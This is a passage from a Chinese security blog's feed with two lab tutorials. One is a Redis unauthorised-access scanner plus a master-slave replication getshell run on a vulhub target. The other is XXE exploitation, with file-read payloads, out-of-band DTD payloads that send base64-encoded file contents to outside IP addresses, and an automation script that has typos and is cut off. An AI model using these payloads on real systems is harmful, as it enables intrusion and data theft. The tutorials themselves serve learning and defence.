print(&#x27;\\033[1;34m#################################################\\033[1;32mTT_xxxxx\\033[&#x27;</span><br><span class=\"line\">          &#x27;1;34m##############################################################\\033[0m\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 使用规则</span><br><span class=\"line\">    def usage():</span><br><span class=\"line\">        print(&#x27;-h: --help 帮助;&#x27;)</span><br><span class=\"line\">        print(&#x27;-p: --port 端口;&#x27;)</span><br><span class=\"line\">        print(&#x27;-u: --url 域名;&#x27;)</span><br><span class=\"line\">        print(&#x27;-s: --type Redis&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br></pre></td></tr></table></figure>\n<p>输出有关该脚本用法的帮助信息，即可执行的参数指令以及对应的功能简介。当然，此处也可以根据自己的喜好设置输出不同类型的字体颜色或者图案</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def start(argv):</span><br><span class=\"line\">    thread = 1</span><br><span class=\"line\">    dict = &#123;&#125;</span><br><span class=\"line\">    utl = &#x27;&#x27;</span><br><span class=\"line\">    type = &quot;&quot;</span><br><span class=\"line\">    if len(sys.argv) &lt; 2:  # 程序外部获取参数的桥梁</span><br><span class=\"line\">        print(&#x27;-h 帮助信息;\\n&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        banner()</span><br><span class=\"line\">        opts, args = getopt.getopt(argv, &#x27;-u:-p:-s:-h&#x27;)</span><br><span class=\"line\">    except getopt.GetoptError:</span><br><span class=\"line\">        print(&#x27;Error an argument!&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    for opt, arg in opts:</span><br><span class=\"line\">        if opt == &#x27;-u&#x27;:</span><br><span class=\"line\">            url = arg</span><br><span class=\"line\">        elif opt == &#x27;-s&#x27;:</span><br><span class=\"line\">            type = arg</span><br><span class=\"line\">        elif opt == &#x27;-p&#x27;:</span><br><span class=\"line\">            port = arg</span><br><span class=\"line\">        elif opt == &#x27;-h&#x27;:</span><br><span class=\"line\">            print(usage())</span><br><span class=\"line\">    launcher(url, type, port)</span><br><span class=\"line\">    </span><br><span class=\"line\">def launcher(url, type, port):</span><br><span class=\"line\">    if type == &#x27;Redis&#x27;:</span><br><span class=\"line\">        output = redis_unathored(url_exec(url), port)</span><br><span class=\"line\">        output_exec(output, type)</span><br></pre></td></tr></table></figure>\n<p>接下来就是 redis 未授权访问检测脚本的核心部分，根据命令行输入端写入的 IP 或 IP 范围，通过 for 语句循环输出<br>\n。此处通过 socket () 函数尝试连接远程主机的 IP 及端口号，发送 payload 字符串。利用 rcvdata () 函数接收目标主机返回的数据，当时返回的数据含有’redis<br>\nversion’字符串时，表明存在未授权访问漏洞，否则不存在</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def redis_unathored(url, port):</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    s = socket.socket()  # 创建socket</span><br><span class=\"line\">    payload = &quot;\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a&quot;</span><br><span class=\"line\">    socket.setdefaulttimeout(10)  # 限制时间</span><br><span class=\"line\"></span><br><span class=\"line\">    for ip in url:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            s.connect((ip, int(port)))  # 进行发送</span><br><span class=\"line\">            s.sendall(payload.encode())  # 判断每次发送的内容量，删除重合</span><br><span class=\"line\">            resves = s.recv(1024).decode()  # 创建存储</span><br><span class=\"line\">            if resves and &#x27;redis_version&#x27; in resves:</span><br><span class=\"line\">                result.append(str(ip) + &quot;:&quot; + str(port) + &#x27;:&#x27; + &#x27;\\033[1;32;40msuccess\\033[0m&#x27;)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">            result.append(str(ip) + &#x27;:&#x27; + str(port) + &#x27;:&#x27; + &#x27;\\033[1;31;40mfailed \\033[0m&#x27;)</span><br><span class=\"line\">        s.close()</span><br><span class=\"line\">    return (result)</span><br></pre></td></tr></table></figure>\n<p>接下来针对 IP 区段内的网络主机进行未授权访问检测，在进行内网渗透测试的过程中，由于输入单个 IP 地址进行测试较为复杂，因此有必要进行 IP 段段内检测。该部分代码主要以特殊字符 &quot;-&quot; 为目标字符进行分隔，将分隔后的字符进行 for 循环存入列表中，以便被函数 redis_unauthored () 调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def url_list(li):</span><br><span class=\"line\">    ss = []</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    j = 0</span><br><span class=\"line\">    zi = []</span><br><span class=\"line\">    for s in li:</span><br><span class=\"line\">        a = s.find(&#x27;-&#x27;)</span><br><span class=\"line\">        i = i + 1</span><br><span class=\"line\">        if a != -1:</span><br><span class=\"line\">            ss = s.rsplit(&quot;-&quot;)</span><br><span class=\"line\">            j = i</span><br><span class=\"line\">            break</span><br><span class=\"line\">    for s in range(int(ss[0]), int(ss[1]) + 1):</span><br><span class=\"line\">        li[j - 1] = str(s)</span><br><span class=\"line\">        aa = &#x27;.&#x27;.join(li)</span><br><span class=\"line\">        zi.append(aa)</span><br><span class=\"line\">    return zi</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def url_exec(url):</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    zi = []</span><br><span class=\"line\">    group = []</span><br><span class=\"line\">    group1 = []</span><br><span class=\"line\">    group2 = []</span><br><span class=\"line\">    li = url.split(&#x27;.&#x27;)</span><br><span class=\"line\">    if (url.find(&#x27;-&#x27;) == -1):</span><br><span class=\"line\">        group.append(url)</span><br><span class=\"line\">        zi = group</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        for s in li:</span><br><span class=\"line\">            a = s.find(&#x27;-&#x27;)</span><br><span class=\"line\">            if a != -1:</span><br><span class=\"line\">                i = i + 1</span><br><span class=\"line\">        zi = url_list(li)</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                zz = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in zz:</span><br><span class=\"line\">                    group.append(ki)</span><br><span class=\"line\">                zi = group</span><br><span class=\"line\">                i = i - 1</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                zzz = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in zzz:</span><br><span class=\"line\">                    group1.append(ki)</span><br><span class=\"line\">            zi = group1</span><br><span class=\"line\">            i = i - 1</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                key = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in key:</span><br><span class=\"line\">                    group2.append(ki)</span><br><span class=\"line\">            zi = group2</span><br><span class=\"line\">    return zi</span><br></pre></td></tr></table></figure>\n<p>设置数据的输出格式，使输出的数据更加美观、简洁，增加可读性。该部分代码的输出字段主要分三段信息，其中包括 IP 地址、端口号、状态信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def output_exec(output, type):</span><br><span class=\"line\">    print(&quot;\\033[1;32;40m&quot; + type + &quot;......\\033[0m&quot;)</span><br><span class=\"line\">    print(&quot;++++++++++++++++++++++++++++++++++++++++++++++++&quot;)</span><br><span class=\"line\">    print(&quot;|         ip         |    port   |     status  |&quot;)</span><br><span class=\"line\">    for li in output:</span><br><span class=\"line\">        print(&quot;+-----------------+-----------+--------------+&quot;)</span><br><span class=\"line\">        print(&quot;|   &quot; + li.replace(&quot;:&quot;, &quot;   |    &quot;) + &quot;  | &quot;)  # 替换字符串</span><br><span class=\"line\">    print(&quot;+----------------+------------+---------------+\\n&quot;)</span><br><span class=\"line\">    print(&quot;[*] shutting down....&quot;)</span><br></pre></td></tr></table></figure>\n<p>该脚本的原理比较简单，我们用 redis-cli 连接过的知道，如果存在未授权漏洞那么 info 命令能输出诸多信息，这里就利用了这个方法，发送 info 的 payload，用函数接收回显信息，判断信息中带有的特殊字段，来判断是否存在漏洞<br>\n<strong>利用主从复制进行 RCE</strong></p>\n<p>上面介绍了拥有 root 权限的 redis 怎么拿 shell，但是也有很多时候 redis 不被赋予 root 权限，这时候就需要用到上面所说的主从复制的知识点来进行 RCE</p>\n<blockquote>\n<p>主从模式指使用一个 redis 作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在 Reids<br>\n4.x 之后，通过外部拓展，可以实现在 redis 中实现一个新的 Redis 命令，构造恶意.so 文件。在两个 Redis 实例设置主从模式的时候，Redis 的主机实例可以通过 FULLRESYNC 同步文件到从机上。然后在从机上加载恶意 so 文件，即可执行命令。</p>\n</blockquote>\n<p>搭建 vulhub 靶场</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>开启<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aiByWcFPqwF5ChJl.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>查看 docker 中启动的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps -a</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v5eDdeSSOFNFyOuy.png!thumbnail\" alt=\"\"></p>\n<p>这里得到刚才启动的 redis 容器的 ID 为 25137f98e35d</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker exec -it 25137f98e35d /bin/bash</span><br></pre></td></tr></table></figure>\n<p>进入容器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/hosts</span><br></pre></td></tr></table></figure>\n<p>查看容器 IP<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XRBrApApv5QKxI2N.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>得到容器 IP 为 172.18.0.2，该 IP 就作为目标 ip 也就是靶机来进行攻击，当然也可以以搭建环境的这台虚拟机来作为靶机，因为 6379 端口已经自动映射出去了</p>\n<p>接下来先测试连接 redis</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DTAcyuTMdPkTLcCv.png!thumbnail\" alt=\"\"></p>\n<p>成功，接着利用脚本进行主从复制 getshell</p>\n<p>工具脚本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand（需要make）</span><br><span class=\"line\">git clone https://github.com/Ridter/redis-rce.git</span><br><span class=\"line\">https://github.com/vulhub/redis-rogue-getshell</span><br><span class=\"line\">https://github.com/jas502n/Redis-RCE</span><br><span class=\"line\">工具下载总结来自：https://blog.51cto.com/u_12343119/5850923</span><br></pre></td></tr></table></figure>\n<p>下载完成后进入目录执行脚本并且使用 exp_lin.so 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./redis-rce.py -r 172.18.0.2 -p 6379 -L 192.168.40.136 -f exp_lin.so</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kQrxYZJ4Sc1R45BM.png!thumbnail\" alt=\"\"></p>\n<p>成功 getshell</p>\n<p><strong>redis 防御策略</strong></p>\n<p>1. 禁止远程使用高危命令</p>\n<p>2. 低权限运行 redis 服务</p>\n<p>3. 禁止外网访问 redis</p>\n<p>4. 阻止其他用户添加新的公钥，将 authorized_keys 的权限设置为对拥有者只读</p>\n",
            "tags": [
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/",
            "title": "外部实体注入漏洞",
            "date_published": "2024-04-16T05:58:19.054Z",
            "content_html": "<p>当允许引用外部实体时，会造成外部实体注入（XXE）漏洞。通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害</p>\n<p>根据有无回显的情况，XXE 漏洞可分为如下两种：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">有回显的XXE</span><br><span class=\"line\">无回显的XXE</span><br></pre></td></tr></table></figure>\n<p>以 XXE-Lab 靶场来进行演示<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JVDd4I64OrHmuUSn.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>有回显 XXE</strong></p>\n<p>先在自己的 C 盘目录下创建一个 txt 文件，内容随便，这里就以 1.txt 和 hacker！！！来进行演示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserName：&amp;b;</span><br><span class=\"line\">Password：admin</span><br></pre></td></tr></table></figure>\n<p>抓包 Login 并发送到重发器<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rbo8AxajVDsDApvV.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这里可以看到是以 xml 的形式发送到 doLogin.php 进行解析，那就直接试着在 body 中加入 xml 的内容，看看是否能被解析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test[</span><br><span class=\"line\">&lt;!ENTITY b SYSTEM &quot;file:///c:/1.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<p>构造 payload 对 C 盘下的 1.txt 文件进行读取， <code>&lt;!ENTITY b SYSTEM &quot;file:///c:/1.txt&quot;&gt;</code>  中的 b 为用户名中的参数，&quot;&quot; 之间为读取文件以及文件路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///                #file协议读取文件</span><br><span class=\"line\">http://url/file.txt     #http协议读取站点下的文件</span><br><span class=\"line\">PHP://filter            #文件流形式读取php文件</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QD1z7SIb6qNXsosT.png!thumbnail\" alt=\"\"></p>\n<p>成功读取，修改 txt 中的内容为 Hello hacker!!! 再试一遍</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7J9GFIIAnSDLuZsJ.png!thumbnail\" alt=\"\"></p>\n<p><strong>无回显 XXE</strong></p>\n<p>接下来进行无回显的 XXE 演示。在这之前需要关闭靶场的信息输出，打开靶场目录下的 php_xxe/doLogin.php 文件</p>\n<blockquote>\n<p>1. 注释 echo $result;<br>\n2. 添加 error_reporting (0);</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4MWYk19N4ue27klM.png!thumbnail\" alt=\"\"></p>\n<p>同样再次尝试注入，发现不会返回任何信息</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DG0D0T2Xqy2zoHPH.png!thumbnail\" alt=\"\"></p>\n<p>对于无回显的 XXE，需要构建一条带外数据（Out-of<br>\nBand，OOB）通道来读取数据，思路如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.攻击者先发送payload1给Web服务器</span><br><span class=\"line\">2.payload1触发web服务器，web服务器向vps获取恶意DTD，并执行payload2</span><br><span class=\"line\">3.payload2使web服务器把结果作为参数来访问vps上的HTTP服务</span><br><span class=\"line\">4.攻击者通过vps的HTTP访问记录得到结果</span><br></pre></td></tr></table></figure>\n<p>攻击过程图如下：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Pzd8oTxfjqAPOBC.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>首先在 vps 上创建名为 evil.xml 的恶意 DTD 文件，并将其放在 apache 的网页目录下，同时开启 apache 服务</p>\n<p>payload1：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test[</span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://117.50.184.154/evil.xml&quot;&gt;</span><br><span class=\"line\">%remote;</span><br><span class=\"line\">%int;</span><br><span class=\"line\">%send;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<p>payload2：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://43.138.160.92/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>\n<p>根据 payload1 和 payload2，evil.xml 是攻击者存放于 vps 上 apache 的 web 目录下的文件，流程理解为：先发送 payload1 给 web 服务器，其中包括文件的读取操作和引用恶意 DTD 的操作，payload1 作为 xml 文件会被发送至 doLogin 进行解析，但是读取后并没有回显，这时候 remote 引用了恶意的 DTD 文件，进行解析，执行了 payload2，执行 send 指令将回显作为参数发送到 vps 上，并且对 vps 的 http 服务进行了访问，这时候攻击者通过 vps 的 http 的访问记录便可以读取到回显。相当于将回显作为参数进行了一次转发，通过另外的渠道进行了读取<br>\n接下来开始复现</p>\n<p>ubuntu 的机子直接用命令安装 apache 服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>\n<p>访问下公网 ip 确定 apache 服务已经搭建完毕<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qcqAu9O76NRWYIjh.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>接着在 /var/www/html 中写入 evil.xml 文件，内容为 payload2，写入成功后 ip/evil.xml 访问文件确认是否能被 payload1 引用到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fJqsGAnuGuvLcOjq.png!thumbnail\" alt=\"\"></p>\n<p>成功，接下来就是利用环节了</p>\n<p>在 vps 上命令开启访问日志的监控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tail -f /var/log/apache2/access.log</span><br></pre></td></tr></table></figure>\n<p>接着抓包登录界面，使用 payload1 并发送到重发器当中进行发送<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DgZpEBzDiFUlWeYq.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>回显 200，发送成功，回 vps 上查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/S0Mks2Mk8aY3DIin.png!thumbnail\" alt=\"\"></p>\n<p>成功实现转发，由于之前对读取操作的回显进行了 base64 编码，因此该串 base64 编码便是读取文件的内容，进行解码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MMGOeCXa0scx5q9e.png!thumbnail\" alt=\"\"></p>\n<p>成功读取</p>\n<p><strong>检测方法</strong></p>\n<blockquote>\n<p>在目标服务器无回显情况下，只能通过 OOB 信息传送来进行 XXE 攻击，但实际的操作过程则比较繁琐，针对无回显的 XXE，通过 python 脚本来实现流程自动化<br>\n写入脚本相关信息和模块</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from http.server import HTTPServer,SimpleHTTPRequestHandler</span><br><span class=\"line\">import threading</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br></pre></td></tr></table></figure>\n<p>编写攻击 payload 的生成函数，能够根据给定的 IP 地址和端口生成相应的包含恶意 DTD 的 XML 文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def ExportPayload(lip,lport):</span><br><span class=\"line\">    file = open(&#x27;evil.xml&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">    file.write(&quot;&lt;!ENTITY % payload \\&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://&#123;0&#125;：&#123;1&#125;/?content=%file;&#x27;&gt;\\&quot;&gt; %payload;&quot;.format(lip,lport))</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\">    print(&quot;[*] payload文件创建成功！&quot;)</span><br></pre></td></tr></table></figure>\n<p>编写 HTTP 服务函数，通过 http.server 模块实现 HTTP 服务，用来监听目标服务器返回的数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 开启HTTP服务，接收数据</span><br><span class=\"line\">def StartHTTP(lip, lport):</span><br><span class=\"line\">    # HTTP监听的IP地址和端口</span><br><span class=\"line\">    serverAddr = (lip, lport)</span><br><span class=\"line\">    httpd = HTTPServer(serverAddr, MyHandler)</span><br><span class=\"line\">    print(&quot;[*]正在开启HTTP服务器：\\n\\n================\\nIP地址:&#123;0&#125;\\n端口：&#123;1&#125;\\n==================\\n&quot;.format(lip, lport))</span><br><span class=\"line\">    httpd.server_forever()</span><br></pre></td></tr></table></figure>\n<p>编写 POST 发送函数，用来向目标服务器发送攻击数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 通过POST发送攻击数据</span><br><span class=\"line\">def SendData(lip, lport, url):</span><br><span class=\"line\">    # 需要读取的文件路径（默认值）</span><br><span class=\"line\">    filePath = &quot;c:\\\\1.txt&quot;</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        # 对用户输入的文件路径斜杠替换</span><br><span class=\"line\">        filePath = filePath.replace(&#x27;\\\\&#x27;, &quot;/&quot;)</span><br><span class=\"line\">        data = &quot;&lt;?xml version=\\&quot;1.0\\&quot;?&gt;\\n&lt;?DOCTYPE test[\\n&lt;!ENtity  % file SYSTEM &quot; \\</span><br><span class=\"line\">               &quot;\\&quot;php://filter/read=convert.base64-encode/resource=&#123;0&#125;\\&quot;&gt;\\n&lt;!ENTUTY % remote SYSTEM \\&quot;http://&#123;1&#125;:&#123;&quot; \\</span><br><span class=\"line\">               &quot;2&#125;/evil.xml\\&quot;&gt;\\n%remote;\\n%int;\\n%send;\\n]&gt;&quot;.format( </span><br><span class=\"line\">            filePath, lip, lport)</span><br><span class=\"line\">        requests.post(url, data=data)</span><br><span class=\"line\">        # 继续接收用户的输入，读取指定文件</span><br><span class=\"line\">        filePath = input(&quot;Input filePath:&quot;)</span><br></pre></td></tr></table></figure>\n<p>定义一个消息处理类，这个类继承自 SimpleHTTPRequestHandler。同时需要对原生的日志消息函数进行重写，使其在输出访问信息的同时，把访问的信息记录到文件中去（该函数位于 BaseHTTPServer.py 中）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 对原生的log_message函数进行重写，在输出结果的同时把结果保存到文件中</span><br><span class=\"line\">class 